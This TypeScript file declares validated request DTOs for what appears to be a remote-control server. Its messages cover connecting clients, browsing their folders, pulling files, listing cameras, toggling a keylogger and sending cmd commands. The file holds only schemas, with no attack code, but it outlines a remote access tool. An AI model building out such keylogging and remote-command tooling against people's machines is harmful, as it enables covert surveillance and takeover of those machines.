import { IsBoolean, IsNotEmpty, IsString } from "class-validator";

export class BaseControllerDto {
  //   @IsString()
  //   @IsNotEmpty()
  messageid!: string;
}

export class CamerasControllerDto extends BaseControllerDto {
}

export class ActivateControllerDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  picture!: string;

  @IsString()
  @IsNotEmpty()
  name!: string;
}

export class AddFriendToControllerDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  clientid!: string;

  @IsString()
  @IsNotEmpty()
  name!: string;

  @IsString()
  @IsNotEmpty()
  picture!: string;
}

export class DeleteFriendFromControllerDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  clientid!: string;

}

export class ConnectClientDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  clientid!: string;

  @IsString()
  @IsNotEmpty()
  username!: string;

  @IsString()
  @IsNotEmpty()
  avatar!: string;
}

export class SelectCurrentClientDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  clientid!: string;
}

export class SendFileToClientDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  fileroute!: string;
}

export class GetFileDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  fileroute!: string;

  @IsString()
  @IsNotEmpty()
  controllerid!: string;
}

export class GetExplorerFromClientDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  folder!: string;

  @IsString()
  @IsNotEmpty()
  relativepath!: string;
}

export class SendKeyloggerToClientDto extends BaseControllerDto {
  @IsBoolean()
  @IsNotEmpty()
  status!: boolean;
}

export class SendCmdCommandToClientDto extends BaseControllerDto {
  @IsString()
  @IsNotEmpty()
  command!: string;
}
